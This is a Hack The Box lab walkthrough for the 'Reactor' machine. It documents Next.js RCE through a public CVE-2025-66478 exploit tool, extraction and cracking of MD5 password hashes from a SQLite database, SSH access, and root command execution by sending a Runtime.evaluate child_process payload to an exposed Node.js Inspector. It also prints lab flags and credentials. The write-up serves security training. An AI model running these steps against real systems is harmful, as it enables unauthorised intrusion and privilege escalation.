# HTB-Reactor-(Season-11)
⚛️ Reactor — Hack The Box Walkthrough (Very Easy)
A complete walkthrough for the Reactor machine on Hack The Box, demonstrating reconnaissance, remote code execution via a vulnerable Next.js application, credential extraction, SSH access, and privilege escalation through the Node.js Inspector.

---

## 📌 Machine Information

| Category | Details |
|-----------|----------|
| Platform | Hack The Box |
| Machine Name | Reactor |
| Difficulty | Very Easy |
| OS | Linux |
| Vulnerabilities | CVE-2025-66478, Node.js Inspector Abuse |

---

## 🧭 Table of Contents

- [Reconnaissance](#-reconnaissance)
- [Initial Access — CVE-2025-66478](#-initial-access--cve-2025-66478)
- [Database Enumeration](#-database-enumeration)
- [Cracking the Hash](#-cracking-the-hash)
- [SSH Access](#-ssh-access)
- [Privilege Escalation — Node.js Inspector](#-privilege-escalation--nodejs-inspector)
- [Attack Chain Summary](#-attack-chain-summary)
- [Tools Used](#-tools-used)
- [Legal Disclaimer](#-legal-disclaimer)
- [Acknowledgments](#-acknowledgments)

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV 10.129.8.62
```

### 📡 Open Ports

| Port | Service | Version |
|------|----------|----------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 3000/tcp | HTTP | Next.js 15.0.3 |

The web application running on port 3000 is a Next.js dashboard used for monitoring a nuclear reactor.

---

### 🚪 Initial Access — CVE-2025-66478 (React2Shell)

```bash
python3 -m venv venv3
source venv3/bin/activate

git clone https://github.com/hackersatyamrastogi/react2shell-ultimate.git
cd react2shell-ultimate

pip3 install -r requirements.txt
```
### ✅ Verify Vulnerability

```bash
python3 react2shell-ultimate.py -u http://10.129.8.62:3000
```
### 💥 Execute Remote Command

```bash
id
ls
whoami
hostname
uname -a
```

```bash
uid=999(node) gid=988(node) groups=988(node)
```

---

### 🗄️ Database Enumeration

```bash
cd /home
ls -la
```

```bash
/home/engineer
/home/node
```

### 🧪 Read SQLite Database

```bash
ubuntu@target:/opt/reactor-app$ cat reactor.db
```

```bash
1- ubuntu@target:/opt/reactor-app$ file reactor.db
2- ubuntu@target:/opt/reactor-app$ .download reactor.db
3- sqlite3 reactor.db
--> .tables
--> .schema
4- SELECT * FROM users;

you will see these two users along with hashes, know we will crack these using tool CrackStations....

1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb

```

```bash
39d97110eafe2a9a68639812cd271e8e
```

---

### 🔑 Cracking the Hash

```bash
hash-identifier 39d97110eafe2a9a68639812cd271e8e
```
The hash was identified as MD5.

```bash
Username: engineer
Password: reactor1
```

---

### 🖥️ SSH Access
```bash
ssh engineer@10.129.8.62
```
Password:
```bash
reactor1
```

### 🚩 User Flag

```bash
cat /home/engineer/user.txt
```

```bash
ae03f16d9cc263fb8e30ca26e7f3c03c
```

---

### 👑 Privilege Escalation — Node.js Inspector

During post-exploitation enumeration, I reviewed running processes and identified a Node.js application running as the root user with the Inspector interface enabled.

```bash
ps aux | grep node
```
```bash
root  1397  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```
Since the Node.js Inspector service was bound to 127.0.0.1:9229, it was only accessible locally from the target system. To access it from my attack machine, I established an SSH local port-forwarding tunnel. This forwarded my local port 9229 to the target's localhost port 9229, allowing me to interact with the Inspector service as if it were running locally on my machine.

### 🔌 Create SSH Tunnel
```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.8.62
```
With the SSH tunnel established, any connection made to 127.0.0.1:9229 on my Kali machine was transparently forwarded to the Node.js Inspector service running on the target host.

After forwarding the port, I verified that the Inspector service was accessible by querying the debugging endpoint:

### 🌐 Obtain WebSocket Endpoint
```bash
curl http://127.0.0.1:9229/json
```
The response revealed an active WebSocket debugger endpoint associated with the root-owned process:

```json
{
  "title": "/opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<UUID>"
}
```

### 📦 Install wscat
```bash
npm install -g wscat
```

### 🔗 Connect to the Inspector
```bash
wscat -c ws://127.0.0.1:9229/01234567-89ab-cdef-0123-456789abcdef
```
### 💥 Execute Commands as Root
```bash
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()",
    "returnByValue": true
  }
}
```
### 🚩 Root Flag
```bash
0b8c02ea50b3bd26b66c5a1f182304f7
```

---

### 🧵 Attack Chain Summary

```bash
Nmap Scan
   ↓
Port 3000 → Next.js Application Identified
   ↓
CVE-2025-66478 Exploitation
   ↓
Remote Code Execution as node user
   ↓
Database Extraction
   ↓
MD5 Hash Retrieved
   ↓
Password Cracked → reactor1
   ↓
SSH Access as engineer
   ↓
Node.js Inspector Abuse
   ↓
Root Shell / Root Flag Access
```

---

### 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning & service enumeration |
| react2shell-ultimate | Exploiting React Server Component RCE |
| Hash Identifier | Identifying hash type |
| Online Cracker / Hashcat | Password cracking |
| SSH | Remote access & tunneling |
| wscat | Interacting with Node.js Inspector |

---

### ⚠️ Legal Disclaimer

This walkthrough is intended strictly for educational purposes and authorized security research.

---

### 🙏 Acknowledgments

• Hack The Box
